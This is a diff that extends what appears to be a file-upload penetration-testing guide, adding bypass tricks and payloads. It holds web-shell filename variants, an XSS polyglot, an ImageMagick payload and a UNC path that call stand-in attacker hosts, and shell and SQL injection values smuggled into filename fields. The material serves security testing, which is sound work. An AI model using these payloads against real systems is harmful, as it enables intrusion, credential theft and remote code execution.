@@ -116,6 +116,25 @@ authorization and validation must hold across every step.
   mixed casing: `.pHp`, `.PhAr`.
 - Magic-byte spoofing — valid JPEG header then embedded script;
   verify the server uses content inspection, not extensions alone.
+- Trailing-character tricks: `shell.php.`, `shell.php/`, `shell.php%20`,
+  `shell.php%09`, `shell.php%0a`, `shell.php%0d`, `shell.php.....`;
+  Windows-specific `shell.php::$DATA` (NTFS ADS), `shell.aspx.`
+  (trailing dot), `shell.cer`, `shell.asa` (IIS).
+- Multipart shenanigans: send `filename` twice
+  (`filename="ok.jpg"; filename="shell.php"`), max-length truncation
+  to chop the safe extension, empty filename `.php`, just-extension
+  `.html`.
+- Config drops to flip handlers: `.htaccess` (`AddType` /
+  `AddHandler`), `.user.ini` (`auto_prepend_file`), `web.config` for
+  IIS/ASP.NET — even when only "static" extensions are allowed.
+- GIF-comment XSS one-liner that survives image validators:
+  `GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;`
+- WAF parameter-fuzz tricks: `?file=xx.php` blocked vs.
+  `?file===xx.php` accepted; encode slashes (`..%2f`), try `....//`
+  vs. `../`, drop `http` from absolute URLs.
+- `.scf` (Windows shortcut) upload — when browsed via UNC path it
+  forces NTLM hash disclosure; useful when uploads land on an SMB-
+  reachable share.
 
 ### Archive attacks
 - **Zip Slip** — entries with `../../` to escape extraction dir;
@@ -126,10 +145,23 @@ authorization and validation must hold across every step.
 ### Toolchain exploits
 - ImageMagick / GraphicsMagick legacy vectors (`policy.xml` may
   mitigate) — crafted SVG / PS / EPS invoking external commands or
-  reading files.
+  reading files. MVG SSRF/LFI seed:
+  `push graphic-context / viewbox 0 0 640 480 / fill 'url(http://attacker/)' / pop graphic-context`.
 - Ghostscript in PDF / PS with file operators (`%pipe%`).
-- ExifTool metadata-parsing bugs; overly large or crafted EXIF /
-  IPTC / XMP fields.
+- ExifTool metadata-parsing bugs (e.g. CVE-2021-22204); overly large
+  or crafted EXIF / IPTC / XMP fields.
+- FFmpeg / video pipelines: crafted `.mp4` / `.avi` / `.mov`
+  metadata or external-subtitle references for SSRF / RCE during
+  thumbnail or preview generation.
+- HEIC / AVIF stacks: parser bugs in libheif / libavif during
+  thumbnail conversion (e.g. CVE-2024-48514 in php-heic-to-jpg).
+- Recent CVEs worth fingerprinting:
+  - CVE-2024-29510 — Ghostscript ≤ 10.03.0 EPS-in-JPG polyglot RCE.
+  - CVE-2024-53677 — Apache Struts S2-067 multipart path-traversal RCE.
+  - CVE-2024-57169 — SOPlanning ≤ 1.53 arbitrary upload to web-root.
+- Serverless image proxies (imgproxy, Thumbor, custom Lambda) often
+  accept remote URL sources — pivot to SSRF / LFI before chasing
+  parser bugs.
 
 ### Cloud-storage vectors
 - S3 / GCS presigned uploads — attacker controls
@@ -137,9 +169,22 @@ authorization and validation must hold across every step.
   `image/svg+xml` and inline rendering.
 - Public-read ACL or permissive bucket policies expose uploads
   broadly.
-- Object-key injection via user-controlled path prefixes.
+- Object-key injection via user-controlled path prefixes; sneak
+  `%2f`, unicode homoglyphs, or hidden dot segments past
+  prefix-only allowlists.
 - Signed-URL reuse and stale URLs; serving directly from bucket
   without attachment + nosniff headers.
+- Presigned **POST** policy gaps: weak `conditions` on
+  `content-type`, size, or key prefix — submit one Content-Type at
+  policy time, another at PUT/processing time.
+- ETag / `Content-MD5` mismatches: backend rarely re-checks the
+  hash; multipart uploads have composite ETags that defeat naive
+  integrity checks.
+- V4 signature laxness: extra unsigned headers, wide expiry
+  windows, missing host/region binding — replay against a sibling
+  bucket or after the intended TTL.
+- IMDS / SSRF pivots: post-upload workers without IMDSv2 leak
+  credentials when an SVG / PDF reaches metadata endpoints.
 
 ## Advanced techniques
 
@@ -154,12 +199,27 @@ authorization and validation must hold across every step.
   characters to bypass validators.
 - Null-byte truncation on legacy stacks; overlong paths;
   case-insensitive collisions overwriting existing files.
+- Path traversal in the `filename` field itself:
+  `filename=../../../../etc/passwd`, `filename=/etc/passwd`,
+  URL-encoded `..%2f..%2f..%2ftmp%2fshell.php`, UNC
+  `\\attacker.com\file.png` (Windows — triggers SMB connection).
+- Filename as injection vector when shelled out or used in SQL:
+  `filename="; sleep 10;.jpg"`, `` filename="`whoami`.jpg" ``,
+  `filename="$(whoami).jpg"`, `filename="' OR SLEEP(10)-- -.jpg"`,
+  `filename="https://internal.service/data"` (SSRF).
+- DoS via 255+ char filenames or `lottapixel`-style image dimensions.
 
 ### Processing races
 - Request file immediately after upload but before AV / CDR
   completes.
 - Trigger heavy conversions (large images, deep PDFs) to widen race
   windows.
+- URL-fetch races: when the server pulls from an attacker URL, hit
+  the temp local copy path before validation finishes.
+- HTTP/2 multiplex smuggling: interleave concurrent stream uploads
+  to slip unvalidated chunks past size or content checks.
+- SSRF via `Range` headers on URL-based uploads — partial fetches
+  may redirect through internal hosts or skip validation prefixes.
 
 ### Metadata abuse
 - Oversized EXIF / XMP / IPTC blocks to trigger parser flaws.
